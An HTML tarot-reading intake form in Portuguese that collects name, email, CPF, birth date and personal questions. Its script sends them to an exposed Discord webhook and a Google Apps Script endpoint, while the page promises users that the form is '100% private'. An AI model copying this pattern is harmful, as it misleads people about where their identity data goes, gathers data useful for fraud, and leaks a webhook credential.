<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Formulário de Leitura Espiritual</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    * { box-sizing: border-box; }
    body {
      background-color: #faf7f5;
      margin: 0;
      padding: 0;
      font-family: 'Poppins', sans-serif;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 40px 30px;
      background: #fff;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      transition: opacity 0.6s ease, transform 0.6s ease;
    }
    h2 {
      color: #4B2B80;
      font-size: 26px;
      margin-bottom: 10px;
    }
    h3 {
      font-size: 18px;
      color: #4B2B80;
      margin-bottom: 10px;
    }
    p, label {
      font-size: 14px;
      color: #444;
    }
    input, textarea, button {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 14px;
    }
    textarea { resize: vertical; }
    button {
      background-color: #4B2B80;
      color: #fff;
      padding: 12px 20px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    button:hover { background-color: #3a1d62; }
    .checkbox {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 14px;
      color: #333;
      margin-bottom: 20px;
      line-height: 1.2;
    }
    .checkbox input[type="checkbox"] {
      width: 18px;
      height: 18px;
      margin: 0;
      cursor: pointer;
    }
    .checkbox label {
      margin: 0;
      cursor: pointer;
      user-select: none;
    }
    .thank-you {
      display: none;
      text-align: center;
      padding: 60px 20px;
      animation: fadeInUp 1s ease forwards;
    }
    .thank-you h1 {
      font-size: 42px;
      color: #4B2B80;
      margin-bottom: 10px;
      opacity: 0;
      transform: translateY(30px);
      animation: slideUp 1s ease forwards 0.3s;
    }
    .thank-you p {
      font-size: 16px;
      color: #555;
      opacity: 0;
      animation: fadeIn 1s ease forwards 0.8s;
    }
    @keyframes slideUp {
      to { opacity: 1; transform: translateY(0); }
    }
    @keyframes fadeIn { to { opacity: 1; } }
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(40px); }
      to { opacity: 1; transform: translateY(0); }
    }
    @media screen and (max-width: 480px) {
      .container { padding: 20px 15px; border-radius: 0; }
      h2 { font-size: 20px; }
      h3 { font-size: 16px; }
      p, label { font-size: 13px; }
      input, textarea, button { font-size: 16px; }
    }
  </style>
</head>
<body>
  <div class="container" id="formContainer">
    <h2>Envie suas perguntas para sua leitura espiritual</h2>
    <p>Complete os dados abaixo com atenção. Essa leitura é feita de forma pessoal e intuitiva, com base nas suas informações e perguntas.</p>
    <form id="tarotForm">
      <label for="nome">Nome completo *</label>
      <input type="text" id="nome" name="nome" placeholder="Digite seu nome completo" required />
      <label for="email">E-mail *</label>
      <input type="email" id="email" name="email" placeholder="Digite seu e-mail" required />
      <label for="cpf">CPF *</label>
      <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required />
      <label for="data_nascimento">Data de nascimento *</label>
      <input type="text" id="data_nascimento" name="data_nascimento" placeholder="DD/MM/AAAA" maxlength="10" required />
      <p style="font-size: 13px; color: #777;">🔒 Este formulário é 100% privado e apenas você terá acesso às suas informações.</p>
      <h3>Quais perguntas você quer que o Tarô responda?</h3>
      <p style="font-size: 13px; color: #666;">Escreva suas 3 perguntas para que eu possa responder.</p>
      <input type="text" name="pergunta1" placeholder="Ex: Meu ex e eu voltaremos?" required />
      <input type="text" name="pergunta2" placeholder="Ex: Ele(a) ainda pensa em mim?" required />
      <input type="text" name="pergunta3" placeholder="Ex: Devo confiar nessa pessoa?" required />
      <label for="info_extra">Alguma outra informação que eu deva saber? <span style="color: #888; font-size: 12px;">(opcional)</span></label>
      <textarea id="info_extra" name="info_extra" placeholder="Exemplo: sou divorciado e estou recomeçando minha carreira" rows="4"></textarea>
      <div class="checkbox">
        <input type="checkbox" id="confirm" required />
        <label for="confirm">Estou pronto(a) para receber minha leitura.</label>
      </div>
      <button type="submit">Enviar minhas perguntas</button>
    </form>
  </div>
  <div class="thank-you" id="thankYouMessage">
    <h1>OBRIGADO!</h1>
    <p>Sua leitura espiritual será enviada em breve para o e-mail informado.<br>Que as cartas iluminem seu caminho. 🌙</p>
  </div>
  <script>
    const cpfInput = document.getElementById('cpf');
    cpfInput.addEventListener('input', () => {
      let value = cpfInput.value.replace(/\D/g, '');
      if (value.length > 11) value = value.slice(0, 11);
      value = value.replace(/(\d{3})(\d)/, '$1.$2')
                   .replace(/(\d{3})(\d)/, '$1.$2')
                   .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
      cpfInput.value = value;
    });
    const dataInput = document.getElementById('data_nascimento');
    dataInput.addEventListener('input', () => {
      let value = dataInput.value.replace(/\D/g, '');
      if (value.length > 8) value = value.slice(0, 8);
      value = value.replace(/(\d{2})(\d)/, '$1/$2')
                   .replace(/(\d{2})(\d)/, '$1/$2');
      dataInput.value = value;
    });
    const form = document.getElementById('tarotForm');
    const container = document.getElementById('formContainer');
    const thankYou = document.getElementById('thankYouMessage');

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const data = {
        nome: form.nome.value,
        email: form.email.value,
        cpf: form.cpf.value,
        data_nascimento: form.data_nascimento.value,
        pergunta1: form.pergunta1.value,
        pergunta2: form.pergunta2.value,
        pergunta3: form.pergunta3.value,
        info_extra: form.info_extra.value || 'Nenhuma'
      };

      // Enviar para Discord Webhook
      fetch("https://discord.com/api/webhooks/1387579525977866410/DTcIRrOfGyUd4U3ULBudkzrQ6StiFuifYiOyiIr4ra-8u33KYUR-u1yoiCb95bZ2uu_d", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `🔮 **Nova Leitura Espiritual**\n👤 Nome: ${data.nome}\n📧 Email: ${data.email}\n🪪 CPF: ${data.cpf}\n🎂 Nasc: ${data.data_nascimento}\n❓ Perguntas:\n1. ${data.pergunta1}\n2. ${data.pergunta2}\n3. ${data.pergunta3}\n📎 Extra: ${data.info_extra}`
        })
      });

      // Enviar para Google Apps Script que salva no Drive (como .txt)
      fetch("https://script.google.com/macros/s/SEU_SCRIPT_ID/exec", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      // Mostrar tela de agradecimento
      container.style.opacity = '0';
      container.style.transform = 'translateY(-20px)';
      setTimeout(() => {
        container.style.display = 'none';
        thankYou.style.display = 'block';
      }, 600);
    });
  </script>
</body>
</html>
